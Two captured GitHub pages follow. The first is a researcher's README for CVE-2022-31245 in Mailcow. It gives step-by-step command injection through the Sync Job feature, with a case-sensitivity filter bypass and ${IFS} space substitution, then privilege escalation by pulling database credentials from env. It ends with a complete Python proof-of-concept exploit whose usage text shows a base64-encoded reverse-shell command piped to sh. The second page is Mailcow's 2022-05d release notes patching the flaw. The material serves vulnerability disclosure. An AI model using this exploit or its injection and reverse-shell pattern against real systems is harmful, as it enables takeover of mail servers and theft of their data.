=== Content from github.com_8f7a9560_20250114_212241.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fly1g3%2FMailcow-CVE-2022-31245)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fly1g3%2FMailcow-CVE-2022-31245)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=ly1g3%2FMailcow-CVE-2022-31245)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ly1g3](/ly1g3)
/
**[Mailcow-CVE-2022-31245](/ly1g3/Mailcow-CVE-2022-31245)**
Public

* [Notifications](/login?return_to=%2Fly1g3%2FMailcow-CVE-2022-31245) You must be signed in to change notification settings
* [Fork
  7](/login?return_to=%2Fly1g3%2FMailcow-CVE-2022-31245)
* [Star
   13](/login?return_to=%2Fly1g3%2FMailcow-CVE-2022-31245)

CVE-2022-31245: RCE and domain admin privilege escalation for Mailcow

[13
stars](/ly1g3/Mailcow-CVE-2022-31245/stargazers) [7
forks](/ly1g3/Mailcow-CVE-2022-31245/forks) [Branches](/ly1g3/Mailcow-CVE-2022-31245/branches) [Tags](/ly1g3/Mailcow-CVE-2022-31245/tags) [Activity](/ly1g3/Mailcow-CVE-2022-31245/activity)
 [Star](/login?return_to=%2Fly1g3%2FMailcow-CVE-2022-31245)

 [Notifications](/login?return_to=%2Fly1g3%2FMailcow-CVE-2022-31245) You must be signed in to change notification settings

* [Code](/ly1g3/Mailcow-CVE-2022-31245)
* [Issues
  0](/ly1g3/Mailcow-CVE-2022-31245/issues)
* [Pull requests
  1](/ly1g3/Mailcow-CVE-2022-31245/pulls)
* [Actions](/ly1g3/Mailcow-CVE-2022-31245/actions)
* [Projects
  0](/ly1g3/Mailcow-CVE-2022-31245/projects)
* [Security](/ly1g3/Mailcow-CVE-2022-31245/security)
* [Insights](/ly1g3/Mailcow-CVE-2022-31245/pulse)

Additional navigation options

* [Code](/ly1g3/Mailcow-CVE-2022-31245)
* [Issues](/ly1g3/Mailcow-CVE-2022-31245/issues)
* [Pull requests](/ly1g3/Mailcow-CVE-2022-31245/pulls)
* [Actions](/ly1g3/Mailcow-CVE-2022-31245/actions)
* [Projects](/ly1g3/Mailcow-CVE-2022-31245/projects)
* [Security](/ly1g3/Mailcow-CVE-2022-31245/security)
* [Insights](/ly1g3/Mailcow-CVE-2022-31245/pulse)

# ly1g3/Mailcow-CVE-2022-31245

   ¬†main[Branches](/ly1g3/Mailcow-CVE-2022-31245/branches)[Tags](/ly1g3/Mailcow-CVE-2022-31245/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit¬†History[7 Commits](/ly1g3/Mailcow-CVE-2022-31245/commits/main/) | | |
| [README.md](/ly1g3/Mailcow-CVE-2022-31245/blob/main/README.md "README.md") | | [README.md](/ly1g3/Mailcow-CVE-2022-31245/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# Mailcow CVE-2022-31245

CVE-2022-31245: RCE and Domain Admin privilege escalation for Mailcow. Including POC.

Reported and fixed: 2022-05

Patched Version: <https://github.com/mailcow/mailcow-dockerized/releases/tag/2022-05d>

CVE: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31245>

## CVE-2022-31245: Command Injection, RCE

Severity: 3/3

Type: Command Injection, RCE, Domain Takeover

Affected versions: least 2019 - 2022-05c

A flaw exists in all recent Mailcow versions where a regular user of the system can exploit the ‚ÄúSync Job‚Äù feature to gain a shell using a command injection in imapsync. Using this vunerability a attacker can then easily pivot to the database and escalate privileges to the role of ‚ÄúDomain Admin‚Äù in Mailcow.

This exploit includes persistence by default since Sync Jobs run on a timer.

This exploit compromises the entire Mailcow instance. Tested and working on release as of 2022-05c. Patched in 2022-05d.

### Technical overview

Using the steps below the vulnerability can be recreated.

Gaining shell:

1. Go to the Mailcow login page (not SOGo)
2. Login as a regular user
3. Go to Sync Jobs
4. Set the following values: `hostname=MAILCOW_IP, Port=IMAP_PORT, Username=CURRENT_USER, Password=CURRENT_PASS, Encryption=PLAIN, Interval=1, Active=Check, Custom Parameters=--debug --nosslcheck --PIPEMESS=CMD`
   Where the field "Custom Parameters" is the important field. CMD can be a arbitrary shell command without spaces. Using uppercase is important!
5. Press save and wait 1 min for the command to execute.

Custom Parameters example payload:

```
--debug --nosslcheck --PIPEMESS=touch${IFS}test.txt

```

CMD cannot contain space,quotes or slashes use ${IFS} instead of space. Uppercase for `--PIPEMESS` is important to bypass check in `functions.mailbox.inc.php` at line `340`:

```
if (strpos($custom_params, 'pipemess')) {
	$custom_params = '';
}
```

This uppercase command still works due to the fact that `imapsync` is case insensitive.

Privilege Escalation:

1. After gaining shell on the dovcot container run `env`
2. Find `DBUSER` and `DBPASS`
3. Login to database using `mysql` and credentials
4. Create new admin user or create a new admin API-key

### Proof-of-Concept, POC

Automated POC. POC could in some cases need modification to run against non-local Mailcow instances.

```
#!/bin/python3

description = """

Mailcow authenticated RCE. Only for educational purposes!!
By: ly1g3[at]tuta.io

This exploit can be used to get mailcow domain admin using mysql credentials found in "env" after getting shell.
Quotes, spaces and slash cant be used in cmd. Use ${IFS} as space. End command with ; is recommended.
Example reverse shell use: --cmd 'echo${IFS}PYTHON_REVERSE_SHELL_BASE64${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}sh;' where PYTHON_REVERSE_SHELL_BASE64 is python reverse shell.

Example usage: ./mailcow_poc1.py --url https://192.168.1.2 --user test@local.com --passwd testpass --cmd 'echo${IFS}PYTHON_REVERSE_SHELL_BASE64${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}sh;'

"""

import requests
import urllib
import sys
from urllib.parse import urlparse
import argparse
from argparse import RawTextHelpFormatter
from datetime import datetime

parser = argparse.ArgumentParser(description=description, formatter_class=RawTextHelpFormatter)
parser.add_argument('--url', help='Url to the mailcow server', required=True)
parser.add_argument('--user', help='Mailcow username, example test@mailcow.com', required=True)
parser.add_argument('--passwd', help='Mailcow user password', required=True)
parser.add_argument('--cmd', help='Command to execute', required=True)

args = parser.parse_args()

base_url = args.url
# hostname = urlparse(base_url).netloc
hostname = '127.0.0.1'
user = args.user
password = args.passwd
cmd = args.cmd

# Get the required csrf token
def find_csrf_token(text):
    try:
        start1 = text.index("var csrf_token")
        start2 = text.index("'", start1)
        end2 = text.index("'", start2+1)
        csrf_token = text[start2+1:end2]
        return csrf_token
    except:
        return ""

login_url = base_url + '/'

s = requests.Session()

# Login
r1 = s.post(login_url, data={'login_user': user, 'pass_user': password}, verify=False)

token = find_csrf_token(r1.text)
if not token:
    print("Error no token found, login problems?")
    sys.exit(0)
print(f"CSRF token: {token}")

sync_url = base_url + '/api/v1/add/syncjob'

# Create sync job with command injection
attr = f'{{"host1":"{hostname}","port1":"143","user1":"{user}","password1":"{password}","enc1":"PLAIN","mins_interval":"1","subfolder2":"","maxage":"0","maxbytespersecond":"0","timeout1":"10","timeout2":"10","exclude":"(?i)spam|(?i)junk","custom_params":"--debug --nosslcheck --PIPEMESS={cmd}","subscribeall":"1","active":"1","csrf_token":"{token}"}}'
r2 = s.post(sync_url, data={'attr': attr, 'csrf_token': token}, verify=False)

c = r2.content
if c.find(b"mailbox_modified") != -1:
    print("Success, rule modified")
elif c.find(b"object_exists") != -1:
    print("ERROR: Object exists, remove existing rule before running this")
    print(c)
    sys.exit(0)
else:
    print("ERROR: Something went wrong")
    print(c)
now = datetime.now()
current_time = now.strftime("%H:%M:%S")
print("Command may take 1min to execute...")
print(f"Done at: {current_time}")
```

## About

CVE-2022-31245: RCE and domain admin privilege escalation for Mailcow

### Resources

[Readme](#readme-ov-file)

[Activity](/ly1g3/Mailcow-CVE-2022-31245/activity)
### Stars

[**13**
stars](/ly1g3/Mailcow-CVE-2022-31245/stargazers)
### Watchers

[**2**
watching](/ly1g3/Mailcow-CVE-2022-31245/watchers)
### Forks

[**7**
forks](/ly1g3/Mailcow-CVE-2022-31245/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fly1g3%2FMailcow-CVE-2022-31245&report=ly1g3+%28user%29)

## [Releases](/ly1g3/Mailcow-CVE-2022-31245/releases)

No releases published

## [Packages 0](/users/ly1g3/packages?repo_name=Mailcow-CVE-2022-31245)

No packages published

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_f8bfdc47_20250114_212243.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmailcow%2Fmailcow-dockerized%2Freleases%2Ftag%2F2022-05d)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmailcow%2Fmailcow-dockerized%2Freleases%2Ftag%2F2022-05d)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=mailcow%2Fmailcow-dockerized)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mailcow](/mailcow)
/
**[mailcow-dockerized](/mailcow/mailcow-dockerized)**
Public

* [Notifications](/login?return_to=%2Fmailcow%2Fmailcow-dockerized) You must be signed in to change notification settings
* [Fork
  1.2k](/login?return_to=%2Fmailcow%2Fmailcow-dockerized)
* [Star
   9.4k](/login?return_to=%2Fmailcow%2Fmailcow-dockerized)

* [Code](/mailcow/mailcow-dockerized/tree/2022-05d)
* [Issues
  357](/mailcow/mailcow-dockerized/issues)
* [Pull requests
  35](/mailcow/mailcow-dockerized/pulls)
* [Actions](/mailcow/mailcow-dockerized/actions)
* [Security](/mailcow/mailcow-dockerized/security)
* [Insights](/mailcow/mailcow-dockerized/pulse)

Additional navigation options

* [Code](/mailcow/mailcow-dockerized/tree/2022-05d)
* [Issues](/mailcow/mailcow-dockerized/issues)
* [Pull requests](/mailcow/mailcow-dockerized/pulls)
* [Actions](/mailcow/mailcow-dockerized/actions)
* [Security](/mailcow/mailcow-dockerized/security)
* [Insights](/mailcow/mailcow-dockerized/pulse)

1. [Releases](/mailcow/mailcow-dockerized/releases)
2. [2022-05d](/mailcow/mailcow-dockerized/releases/tag/2022-05d)

# üååüêÆ Mooay 2022 Update - The Tag Update | Revision D (2022-05c)

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/mailcow/mailcow-dockerized/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...2022-05d)

 Loading

[View all tags](/mailcow/mailcow-dockerized/tags)

![@DerLinkman](https://avatars.githubusercontent.com/u/62480600?s=40&v=4)
[DerLinkman](/DerLinkman)
released this
19 May 13:47

[2022-05d](/mailcow/mailcow-dockerized/tree/2022-05d)

[`552f09f`](/mailcow/mailcow-dockerized/commit/552f09f48aacda3a14238101c8a0f4c922ffe65f)

## This is a security update regarding [CVE-2022-31245](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31245) which is desired to be updated immediately

## What's Changed

* [Imapsync] Case sensitive PIPEMESS and PIPEMES removal: [8d9102a](https://github.com/mailcow/mailcow-dockerized/commit/8d9102aa088c780ca2f1cc0f39b224d735dc8569) by [@DerLinkman](https://github.com/DerLinkman)
* [DB] Update DB Version to remove pipemess & pipemes parameters: [552f09f](https://github.com/mailcow/mailcow-dockerized/commit/552f09f48aacda3a14238101c8a0f4c922ffe65f) by [@DerLinkman](https://github.com/DerLinkman)

### This is a security update which is desired to be updated immediately

**Full Changelog**: [2022-05c...2022-05d](https://github.com/mailcow/mailcow-dockerized/compare/2022-05c...2022-05d)

### Contributors

* [![@DerLinkman](https://avatars.githubusercontent.com/u/62480600?s=64&v=4)](https://github.com/DerLinkman)

DerLinkman

 Assets
2

 Loading

 üëç
8
 svengo, rantanlan, 10erNetzwerk, philippdormann, upsilot, timo-reymann, Cisco30, and NPapoutsis reacted with thumbs up emoji

All reactions

* üëç
  8 reactions

 8 people reacted

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.


